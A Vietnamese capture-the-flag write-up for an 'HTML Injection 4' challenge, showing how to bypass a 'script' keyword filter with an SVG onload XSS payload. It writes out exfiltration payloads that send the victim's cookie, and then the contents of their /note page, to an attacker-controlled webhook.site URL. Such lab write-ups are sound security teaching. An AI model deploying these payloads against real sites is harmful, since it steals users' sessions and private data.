# HTML Injection 4

# Thử thách về lỗi bảo mật HTML Injection

# Mục tiêu: Đọc note của nạn nhân
# Code validation
```javascript
router.get('/search', function (req, res, next) {
    // Don't allow script keyword
    if (req.query.q.search(/script/i) > 0) {
        res.send('Hack detected');
        return;
    }
    html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'
    res.send(html);
});
```
# Phân tích
-  Không cho phép từ khóa `script` trong truy vấn tìm kiếm
# bypass
-  Tuy nhiên, ta có thể sử dụng các tag HTML khác để chèn mã JavaScript mà không cần từ khóa `script`.
-  Ví dụ: sử dụng các thẻ HTML như `svg`, `img`, hoặc các thuộc tính sự kiện như `onerror`, `onclick`, `onload` để thực thi mã JavaScript khi sự kiện xảy ra.
-  Ví dụ: `<svg onload=alert(1)>` sẽ hiển thị một thông báo cảnh báo khi SVG được tải.
# Bước thực hiện
-  Truy cập vào đường dẫn `/search?q=<svg onload=alert(1)>`
-  Khi đó, mã JavaScript sẽ được thực thi và hiển thị thông báo cảnh báo với giá trị `1`.
# Kết quả
-  Bạn sẽ thấy một thông báo cảnh báo với giá trị `1`, chứng tỏ rằng bạn đã thành công trong việc thực hiện HTML Injection.
# Lấy cookie
-  Để lấy cookie của nạn nhân, bạn có thể sử dụng mã JavaScript như sau:
```html
<svg onload="fetch('http://your-server.com/steal?cookie='+document.cookie)">
```
-  playload encode:
```url
https://url/search?q=%3Csvg+onload%3D%22fetch%28%27https%3A%2F%2Fwebhook.site%2F3a6cea0c-0c4b-4528-a54e-421553192587%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%29%22%3E
```
-  Khi nạn nhân truy cập vào trang web và mã JavaScript này được thực thi, nó sẽ gửi cookie của nạn nhân đến máy chủ của bạn thông qua một yêu cầu `fetch`.
-  Bạn cần thay thế `http://your-server.com/steal` bằng URL của máy chủ mà bạn đã thiết lập để nhận cookie.
# lỗi không lấy được cookie
```
// start session
app.use(
  session({
    resave: false,
    saveUninitialized: true,
    secret: process.env.SECRET_KEY,
    cookie: {
      maxAge: 86400000,
      httpOnly: true
    },
  })
);
```
-  Đoạn mã trên đã thiết lập cookie với thuộc tính `httpOnly`, điều này ngăn chặn việc truy cập cookie từ JavaScript. Do đó, mã JavaScript không thể lấy cookie của nạn nhân.
-  Để giải quyết vấn đề này, bạn có thể sử dụng một phương pháp khác để lấy thông tin từ trang web, chẳng hạn như gửi yêu cầu đến một endpoint khác mà không cần sử dụng cookie.
-  Ví dụ, bạn có thể sử dụng mã JavaScript như sau để lấy nội dung của một phần tử cụ thể trên trang web:
```html
<svg onload="fetch('/note').then(r=>r.text()).then(d=>fetch('https://webhook.site/3a6cea0c-0c4b-4528-a54e-421553192587?note='+encodeURIComponent(d)))">
```
-  playload encode:
```url
https://URL/search?q=%3Csvg+onload%3D%22fetch%28%27%2Fnote%27%29.then%28r%3D%3Er.text%28%29%29.then%28d%3D%3Efetch%28%27https%3A%2F%2Fwebhook.site%2F3a6cea0c-0c4b-4528-a54e-421553192587%3Fnote%3D%27%2BencodeURIComponent%28d%29%29%29%22%3E
```
-  Payload này sẽ tự động lấy nội dung từ endpoint `/note` và gửi dữ liệu đó ra ngoài (đến webhook) khi nạn nhân truy cập vào trang có payload này.
Nó không cần truy cập cookie, nên vẫn hoạt động ngay cả khi cookie bị đặt thuộc tính `HttpOnly`.
-  Bạn cần thay thế `http://your-server.com/steal` bằng URL của máy chủ mà bạn đã thiết lập để nhận nội dung.
# Kết quả
-  Nội dung của phần tử có id `note` đã được gửi đến `webhook`


